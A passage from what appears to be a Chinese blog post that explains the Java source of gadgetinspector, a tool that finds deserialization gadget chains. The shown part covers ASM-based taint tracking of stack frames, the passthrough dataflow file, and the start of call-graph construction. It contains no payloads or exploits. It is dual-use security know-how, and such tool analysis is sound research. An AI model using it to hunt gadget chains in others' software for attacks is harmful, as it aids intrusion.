class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 模拟堆栈变化</span></span><br><span class="line">                        <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">                        <span class="comment">// 取值完成后要将值重新压入到栈中 以便继续使用 即污点被压栈了</span></span><br><span class="line">                        setStackTaint(<span class="number">0</span>, taint);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.PUTFIELD:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// putField 与 两个槽数据的getField 堆栈变化放到这里了</span></span><br><span class="line">            <span class="comment">// 只会引起堆栈变化并不影响污点的变化</span></span><br><span class="line">            <span class="comment">// 静态操作不受控制 不影响污点传播</span></span><br><span class="line">            <span class="comment">// putField 操作前污点值已经咋栈上 执行完毕后改值会被弹出，不需要额外设置</span></span><br><span class="line">            <span class="comment">// long 和 double 类型数据传播到sink点也没啥价值，这里直接忽略掉了</span></span><br><span class="line">            <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>TaintTrackingMethodVisitor 的方法 visitFieldInsn 主要负责模拟指令执行时栈帧的变化  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">typeSize</span> <span class="operator">=</span> Type.getType(desc).getSize();</span><br><span class="line">        <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">            <span class="comment">// 从class中读数据 然后将读取的数据 压入栈</span></span><br><span class="line">            <span class="keyword">case</span> Opcodes.GETSTATIC:</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; typeSize; i++) &#123;</span><br><span class="line">                    push();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 从栈上弹出数据 然后给class对象指定的变量赋值</span></span><br><span class="line">            <span class="keyword">case</span> Opcodes.PUTSTATIC:</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; typeSize; i++) &#123;</span><br><span class="line">                    pop();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 取值会 先从栈上弹出对象的引用 然后将取出的字段压入栈中</span></span><br><span class="line">            <span class="keyword">case</span> Opcodes.GETFIELD:</span><br><span class="line">                pop();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; typeSize; i++) &#123;</span><br><span class="line">                    push();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 先从栈上将数据弹出来 然后弹出要被赋值的对象的引用 最后进行赋值</span></span><br><span class="line">            <span class="keyword">case</span> Opcodes.PUTFIELD:</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; typeSize; i++) &#123;</span><br><span class="line">                    pop();</span><br><span class="line">                &#125;</span><br><span class="line">                pop();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line"></span><br><span class="line">        sanityCheck();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>当出现方法调用时会调用 visitMethodInsn 方法   </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;</span><br><span class="line">            Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line">            <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123; <span class="comment">// 处理实例方法调用的 this，将 this 加入到参数列表中</span></span><br><span class="line">                Type[] extendedArgTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[argTypes.length+<span class="number">1</span>];</span><br><span class="line">                System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">                extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);</span><br><span class="line">                argTypes = extendedArgTypes;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 返回值大小</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">retSize</span> <span class="operator">=</span> Type.getReturnType(desc).getSize();</span><br><span class="line"></span><br><span class="line">            Set&lt;Integer&gt; resultTaint;</span><br><span class="line">            <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKESTATIC:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKESPECIAL:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:</span><br><span class="line">                    <span class="comment">// 初始化 参数污点列表</span></span><br><span class="line">                    <span class="keyword">final</span> List&lt;Set&lt;Integer&gt;&gt; argTaint = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Set&lt;Integer&gt;&gt;(argTypes.length);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                        argTaint.add(<span class="literal">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> <span class="variable">stackIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="comment">// 调用方法前 方法的参数都会被先压到栈上 所以这里先从栈上将污点取出来</span></span><br><span class="line">                    <span class="comment">// 从这里可以看出  参数是从右往左压栈的</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                        <span class="type">Type</span> <span class="variable">argType</span> <span class="operator">=</span> argTypes[i];</span><br><span class="line">                        <span class="keyword">if</span> (argType.getSize() &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                            argTaint.set(argTypes.length - <span class="number">1</span> - i, getStackTaint(stackIndex + argType.getSize() - <span class="number">1</span>));</span><br><span class="line">                        &#125;</span><br><span class="line">                        stackIndex += argType.getSize();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 构造方法将被第一个参数污染</span></span><br><span class="line">                    <span class="keyword">if</span> (name.equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">                        <span class="comment">// Pass result taint through to original taint set; the initialized object is directly tainted by</span></span><br><span class="line">                        <span class="comment">// parameters</span></span><br><span class="line">                        resultTaint = argTaint.get(<span class="number">0</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        resultTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 当前方法是否已经被分析过了 参数与返回值的传播关系</span></span><br><span class="line">                    Set&lt;Integer&gt; passthrough = passthroughDataflow.get(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc));</span><br><span class="line">                    <span class="comment">// 如果已经被分析过了 直接获取已有的结果</span></span><br><span class="line">                    <span class="keyword">if</span> (passthrough != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (Integer passthroughDataflowArg : passthrough) &#123;</span><br><span class="line">                            resultTaint.addAll(argTaint.get(passthroughDataflowArg));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 如果没有分析过 那就是前面的方法调用拓扑排序存在异常，这种情况基本不可能出现</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 处理方法调用过程中的操作数栈变化</span></span><br><span class="line">            <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">            <span class="comment">// 如果存在返回值</span></span><br><span class="line">            <span class="keyword">if</span> (retSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 补充而不是设置 因为时集合的缘故，重复的值会被剔除掉</span></span><br><span class="line">                getStackTaint(retSize-<span class="number">1</span>).addAll(resultTaint);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>处理方法调用过程中的操作数栈变化  同时进行污点跟踪 与 PassthroughDataflowMethodVisitor 的 visitMethodInsn 有重复的逻辑。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> MethodReference.<span class="type">Handle</span> <span class="variable">methodHandle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc);</span><br><span class="line"></span><br><span class="line">        Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line">        <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;</span><br><span class="line">            Type[] extendedArgTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[argTypes.length+<span class="number">1</span>];</span><br><span class="line">            System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">            extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);</span><br><span class="line">            argTypes = extendedArgTypes;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Type</span> <span class="variable">returnType</span> <span class="operator">=</span> Type.getReturnType(desc);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">retSize</span> <span class="operator">=</span> returnType.getSize();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.INVOKESTATIC:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.INVOKESPECIAL:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:</span><br><span class="line">                <span class="comment">// 定义参数列表</span></span><br><span class="line">                <span class="keyword">final</span> List&lt;Set&lt;T&gt;&gt; argTaint = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Set&lt;T&gt;&gt;(argTypes.length);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                    argTaint.add(<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 方法调用完后会恢复栈帧，将方法的参数弹出栈</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                    <span class="type">Type</span> <span class="variable">argType</span> <span class="operator">=</span> argTypes[i];</span><br><span class="line">                    <span class="keyword">if</span> (argType.getSize() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// 占两个槽的 数据需要先弹一次 因为污点数据存储在更下层的槽位中 </span></span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; argType.getSize() - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                            pop();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 将栈上的污点压入被调用方法的参数污点列表中</span></span><br><span class="line">                        argTaint.set(argTypes.length - <span class="number">1</span> - i, pop());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Set&lt;T&gt; resultTaint;</span><br><span class="line">                <span class="comment">// 构造方法的返回值会被第一个参数污染</span></span><br><span class="line">                <span class="keyword">if</span> (name.equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// Pass result taint through to original taint set; the initialized object is directly tainted by</span></span><br><span class="line">                    <span class="comment">// parameters</span></span><br><span class="line">                    resultTaint = argTaint.get(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    resultTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// If calling defaultReadObject on a tainted ObjectInputStream, that taint passes to &quot;this&quot;</span></span><br><span class="line">                <span class="keyword">if</span> (owner.equals(<span class="string">&quot;java/io/ObjectInputStream&quot;</span>) &amp;&amp; name.equals(<span class="string">&quot;defaultReadObject&quot;</span>) &amp;&amp; desc.equals(<span class="string">&quot;()V&quot;</span>)) &#123;</span><br><span class="line">                    savedVariableState.localVars.get(<span class="number">0</span>).addAll(argTaint.get(<span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 已知的一些预定义的污染关系</span></span><br><span class="line">                <span class="keyword">for</span> (Object[] passthrough : PASSTHROUGH_DATAFLOW) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (passthrough[<span class="number">0</span>].equals(owner) &amp;&amp; passthrough[<span class="number">1</span>].equals(name) &amp;&amp; passthrough[<span class="number">2</span>].equals(desc)) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; passthrough.length; i++) &#123;</span><br><span class="line">                            resultTaint.addAll(argTaint.get((Integer)passthrough[i]));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果存在已分析的传播流数据</span></span><br><span class="line">                <span class="keyword">if</span> (passthroughDataflow != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 尝试从其中取出当前方法的污点传播流数据</span></span><br><span class="line">                    Set&lt;Integer&gt; passthroughArgs = passthroughDataflow.get(methodHandle);</span><br><span class="line">                    <span class="comment">// 如果当前方法的污点传播流已经被分析过了</span></span><br><span class="line">                    <span class="keyword">if</span> (passthroughArgs != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 遍历得到当前方法会被哪些参数污染</span></span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> arg : passthroughArgs) &#123;</span><br><span class="line">                            <span class="comment">// 从入参中取出对应位置的污点 放到 resultTaint 中 resultTaint 表示当前方法的返回值会被哪个入参污染</span></span><br><span class="line">                            resultTaint.addAll(argTaint.get(arg));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Heuristic; if the object implements java.util.Collection or java.util.Map, assume any method accepting an object</span></span><br><span class="line">                <span class="comment">// taints the collection. Assume that any method returning an object returns the taint of the collection.</span></span><br><span class="line">                <span class="comment">// 如果不是静态方法调用 且第一个参数非基本数据类型</span></span><br><span class="line">                <span class="comment">// 针对集合以及映射做的特殊处理</span></span><br><span class="line">                <span class="comment">// 假设任意接受对象的方法均会污染集合 假设任意返回对象的方法都会返回集合的污点</span></span><br><span class="line">                <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC &amp;&amp; argTypes[<span class="number">0</span>].getSort() == Type.OBJECT) &#123;</span><br><span class="line">                    Set&lt;ClassReference.Handle&gt; parents = inheritanceMap.getSuperClasses(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(argTypes[<span class="number">0</span>].getClassName().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)));</span><br><span class="line">                    <span class="keyword">if</span> (parents != <span class="literal">null</span> &amp;&amp; (parents.contains(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/util/Collection&quot;</span>)) ||</span><br><span class="line">                            parents.contains(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/util/Map&quot;</span>)))) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; argTaint.size(); i++) &#123;</span><br><span class="line">                            argTaint.get(<span class="number">0</span>).addAll(argTaint.get(i));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (returnType.getSort() == Type.OBJECT || returnType.getSort() == Type.ARRAY) &#123;</span><br><span class="line">                            resultTaint.addAll(argTaint.get(<span class="number">0</span>));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 方法调用完需要如果需要返回数据 则需要先将返回值压栈</span></span><br><span class="line">                <span class="keyword">if</span> (retSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    push(resultTaint);</span><br><span class="line">                    <span class="comment">// 如果返回值占据两个槽位则还要压一次</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; retSize; i++) &#123;</span><br><span class="line">                        push();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line"></span><br><span class="line">        sanityCheck();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>当方法执行完毕需要返回时 调用  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInsn</span><span class="params">(<span class="type">int</span> opcode)</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span>(opcode) &#123;</span><br><span class="line">                <span class="comment">// 这些指令操作的数据在操作数栈上只占据一个槽位</span></span><br><span class="line">                <span class="keyword">case</span> Opcodes.IRETURN:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.FRETURN:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.ARETURN:</span><br><span class="line">                    <span class="comment">// 从污点栈上取出最上面的一个数据 设置到 returnTaint 中</span></span><br><span class="line">                    <span class="comment">// 如果污点栈上的数据与形参存在关联则证明 该参数可以影响方法的返回值</span></span><br><span class="line">                    returnTaint.addAll(getStackTaint(<span class="number">0</span>));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// 同样的 这些指令占据两个槽位</span></span><br><span class="line">                <span class="keyword">case</span> Opcodes.LRETURN:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.DRETURN:</span><br><span class="line">                    returnTaint.addAll(getStackTaint(<span class="number">1</span>));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// void</span></span><br><span class="line">                <span class="keyword">case</span> Opcodes.RETURN:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.visitInsn(opcode);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>最终数据传播流图的的分析结果将被存储在字段 gadgetinspector.PassthroughDiscovery.passthroughDataflow，该字段的签名为 Map&lt;MethodReference.Handle, Set<Integer>&gt;，<br>即一个通过方法名句柄索引结果的 Map 映射，Map 的值为会污染该方法返回值的形参位置集合。<br>passthroughDataflow 最终会被保存在文件 passthrough.dat 中，数据的存储格式为<br>方法所属类全类名|方法名|方法描述符|污染的参数位置1,污染的参数位置2,污染的参数位置3…<br>如：<br>javax&#x2F;swing&#x2F;plaf&#x2F;nimbus&#x2F;OptionPanePainter	decodeEllipse1	()Ljava&#x2F;awt&#x2F;geom&#x2F;Ellipse2D;	0,  </p>
<h4 id="构造调用图"><a href="#构造调用图" class="headerlink" title="构造调用图"></a>构造调用图</h4><p>上一步的 passthroughDataflow生成是宏观的方法参数与返回值的关系并没有关系到方法内部的污染关系，若要形成 Gadgets 链还需确定父方法与子方法之间的参数传递关系。<br>这一步主要是分析方法的参数与其调用的子方法之间的关系，即子方法的参数是否会被其父方法的参数所污染。<br>因为涉及到方法内部的细节处理，所以这里仍然需要使用 MethodVisitor， 对应的方法访问器实现类为 ModelGeneratorMethodVisitor。<br>ModelGeneratorMethodVisitor 也是继承自 TaintTrackingMethodVisitor，其单独重写了visitCode visitFieldInsn 以及 visitMethodInsn 方法。  </p>
<p>该方法整体流程与数据传播流图分析时的 visitCode 方法一致，区别在于局部变量表中存储的数据。数据流图分析时局部变量表中存储的是参数的索引，<br>此时存储的是一个以<code>arg</code>开头并追加参数索引的字符串，如：arg0，arg1。这样做的目的在于分析父方法与被调用子方法之间的形参传递时，<br>能够通过检查子方法的参数值是否以<code>arg</code> 来头来判断父方法的形参是否传递到了子方法中。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">localIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">                setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">                localIndex += <span class="number">1</span>;</span><br><span class="line">                argIndex += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">                setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">                localIndex += argType.getSize();</span><br><span class="line">                argIndex += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>针对字段访问相关的字节码指令进行处理。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc)</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.PUTSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETFIELD:</span><br><span class="line">                    <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc);</span><br><span class="line">                    <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="type">Boolean</span> <span class="variable">isTransient</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                        <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                            isTransient = Boolean.TRUE;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="type">ClassReference</span> <span class="variable">clazz</span> <span class="operator">=</span> classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner));</span><br><span class="line">                            <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                        isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (isTransient != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                clazz = classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(clazz.getSuperClass()));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        Set&lt;String&gt; newTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                        <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                            <span class="comment">// 栈顶放的时对象的引用 构造污点标识符</span></span><br><span class="line">                            <span class="comment">// 如果对象来自父方法的入参 则 s 为 arg1.fieldName</span></span><br><span class="line">                            <span class="keyword">for</span> (String s : getStackTaint(<span class="number">0</span>)) &#123;</span><br><span class="line">                                newTaint.add(s + <span class="string">&quot;.&quot;</span> + name);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 模拟操作数栈变化</span></span><br><span class="line">                        <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">                        <span class="comment">// 将取字段的结果放入到栈顶 即 arg1.fieldName</span></span><br><span class="line">                        setStackTaint(<span class="number">0</span>, newTaint);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.PUTFIELD:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 模拟操作数栈变化</span></span><br><span class="line">            <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>针对方法访问进行处理  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;</span><br><span class="line">            Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line">            <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;</span><br><span class="line">                Type[] extendedArgTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[argTypes.length+<span class="number">1</span>];</span><br><span class="line">                System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">                extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);</span><br><span class="line">                argTypes = extendedArgTypes;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span 